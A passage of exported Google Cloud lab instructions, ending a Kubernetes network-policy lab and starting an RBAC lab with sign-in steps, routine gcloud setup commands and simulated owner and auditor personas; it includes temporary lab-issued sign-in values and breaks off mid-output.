</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Destroy complete! Resources: 5 destroyed.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><h3 id='task-9-troubleshooting-in-your-own-environment'><span>Task 9. Troubleshooting in your own environment</span></h3><h4 id='the-install-script-fails-with-a-permission-denied-error-when-running-terraform'><span>The install script fails with a &quot;permission denied&quot; error when running Terraform</span></h4><p><span>The credentials that Terraform is using do not provide the necessary permissions to create resources in the selected projects. Ensure that the account listed in </span><code>gcloud config list</code><span> has necessary permissions to create resources. If it does, regenerate the application default credentials using </span><code>gcloud auth application-default login</code><span>.</span></p><h4 id='invalid-fingerprint-error-during-terraform-operations'><span>Invalid fingerprint error during Terraform operations</span></h4><p><span>Terraform occasionally complains about an invalid fingerprint, when updating certain resources.</span></p><p><span>If you see the error below, simply re-run the command. </span><img src="images\MovqAAg0Chnh9QY%2BsrRn5WUzsqrVNSRw6sB2lF46U1w%3D" referrerpolicy="no-referrer" alt="terraform fingerprint error"></p><h3 id='congratulations-27'><span>Congratulations!</span></h3><p><span>You improved the security of your Kubernetes Engine by applying fine-grained restrictions to network communication.</span></p><h2 id='lab---using-role-based-access-control-in-kubernetes-engine'><span>LAB - Using Role-based Access Control in Kubernetes Engine</span></h2><h2 id='overview-31'><span>Overview</span></h2><p><span>This lab covers the usage and debugging of </span><a href='https://kubernetes.io/docs/reference/access-authn-authz/rbac/'><span>role-based access control (RBAC)</span></a><span> in a Kubernetes Engine cluster.</span></p><p><span>While RBAC resource definitions are standard across all Kubernetes platforms, their interaction with underlying authentication and authorization providers needs to be understood when building on any cloud provider.</span></p><p><span>RBAC is a powerful security mechanism that provides great flexibility in how you restrict operations within a cluster. This lab will cover two use cases for RBAC:</span></p><ol start='' ><li><p><span>Assigning different permissions to user personas, namely owners and auditors.</span></p></li><li><p><span>Granting limited API access to an application running within your cluster.</span></p></li></ol><p><span>Since RBAC&#39;s flexibility can occasionally result in complex rules, common steps for troubleshooting RBAC are included as part of scenario 2.</span></p><h2 id='architecture-4'><span>Architecture</span></h2><p><span>This lab focuses on the use of RBAC within a Kubernetes Engine cluster. It demonstrates how varying levels of cluster privilege can be granted to different user personas. You will provision two service accounts to represent user personas and three namespaces: dev, test, and prod. The &quot;owner&quot; persona will have read-write access to all three namespaces, while the &quot;auditor&quot; persona will have read-only access and be restricted to the dev namespace.</span></p><p><span>This lab was created by GKE Helmsman engineers to help you grasp a better understanding of Using role-based access controls in GKE. You can </span><a href='https://github.com/GoogleCloudPlatform/gke-rbac-demo.git'><span>view this demo on Github</span></a><span>. We encourage any and all to contribute to our assets!</span></p><p><img src="images\s7ZjmSO2Z2fvTB1Dw4GAXuGlJQkmii7Jyvd12Wzcsu4%3D" referrerpolicy="no-referrer" alt="Architecture Diagram"></p><h2 id='setup-and-requirements-28'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-14'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-9'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-d79e7215c92b@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rDBeNJgZxCDO</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='activate-cloud-shell-4'><span>Activate Cloud Shell</span></h3><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>qwiklabs-gcp-03-e21f4fbacbec</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to qwiklabs-gcp-03-e21f4fbacbec</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: student-02-d79e7215c92b@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-03-e21f4fbacbec</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h2 id='set-your-region-and-zone'><span>Set your region and zone</span></h2><p><span>Certain Compute Engine resources live in regions and zones. A region is a specific geographical location where you can run your resources. Each region has one or more zones.</span></p><p><span>Learn more about regions and zones and see a complete list in </span><a href='https://cloud.google.com/compute/docs/regions-zones/'><span>Regions &amp; Zones documentation</span></a><span>.</span></p><p><span>Run the following to set a region and zone for your lab (you can use the region/zone that&#39;s best for you):</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set compute/region europe-west4</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set compute/zone europe-west4-a</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h2 id='task-1-verify-the-cluster'><span>Task 1. Verify the cluster</span></h2><p><span>Confirm the pre created cluster in the Console. Go to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Kubernetes Engine</span></strong><span> &gt; </span><strong><span>Clusters</span></strong><span> and click on the &#39;rbac-demo-cluster&#39; cluster. Ensure that Legacy Authorization is disabled for the new cluster.</span></p><p><img src="images\HMekjKZOqJ2Gw9B%2FPaimNfnE3C1geKfjUeWwWSUJqM0%3D" referrerpolicy="no-referrer" alt="Cluster settings in console"></p><h2 id='task-2-scenario-1-assigning-permissions-by-user-persona'><span>Task 2. Scenario 1: Assigning permissions by user persona</span></h2><h3 id='iam---role'><span>IAM - role</span></h3><p><span>A role named </span><code>kube-api-ro-xxxxxxxx</code><span> (where </span><code>xxxxxxxx</code><span> is a random string) has been created with the permissions below as part of the Terraform configuration in </span><code>iam.tf</code><span>. These permissions are the minimum required for any user that requires access to the Kubernetes API.</span></p><ul><li><p><span>container.apiServices.get</span></p></li><li><p><span>container.apiServices.list</span></p></li><li><p><span>container.clusters.get</span></p></li><li><p><span>container.clusters.getCredentials</span></p></li></ul><h3 id='simulating-users'><span>Simulating users</span></h3><p><span>Three service accounts have been created to act as Test Users:</span></p><ul><li><p><strong><span>admin:</span></strong><span> has admin permissions over the cluster and all resources</span></p></li><li><p><strong><span>owner:</span></strong><span> has read-write permissions over common cluster resources</span></p></li><li><p><strong><span>auditor:</span></strong><span> has read-only permissions within the dev namespace only</span></p></li></ul><ol start='' ><li><p><span>Run the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam service-accounts list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Three test hosts have been provisioned by the Terraform script. Each node has </span><code>kubectl</code><span> and </span><code>gcloud</code><span> installed and configured to simulate a different user persona.</span></p><ul><li><p><strong><span>gke-tutorial-admin</span></strong><span>: kubectl and gcloud are authenticated as a cluster administrator.</span></p></li><li><p><strong><span>gke-tutorial-owner</span></strong><span>: simulates the </span><code>owner</code><span> account</span></p></li><li><p><strong><span>gke-tutorial-auditor</span></strong><span>: simulates the </span><code>auditor</code><span> account</span></p></li></ul><ol start='' ><li><p><span>Run the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ZONE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MACHINE_TYPE &nbsp; PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP &nbsp; &nbsp; STATUS</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rbac-demo-cluster-default-pool-a9cd3468-4vpc &nbsp;  europe-west4-a  n1-standard-1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  10.0.96.5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rbac-demo-cluster-default-pool-a9cd3468-b47f &nbsp;  europe-west4-a  n1-standard-1 